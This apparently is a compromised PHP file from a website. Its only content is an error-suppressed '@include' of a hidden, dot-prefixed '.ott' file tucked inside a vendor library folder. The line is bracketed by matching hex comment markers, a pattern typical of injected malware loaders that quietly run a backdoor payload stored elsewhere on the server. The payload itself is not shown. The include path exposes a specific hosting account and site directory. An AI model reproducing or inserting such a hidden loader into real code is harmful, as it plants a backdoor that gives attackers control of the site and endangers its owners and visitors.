<?php
/*6e2fa*/

@include ("/home/customdevopdigit/mellymunchies.custom.devopdigital.com/vendor/doctrine/lexer/.1de4536f.ott");

/*6e2fa*/

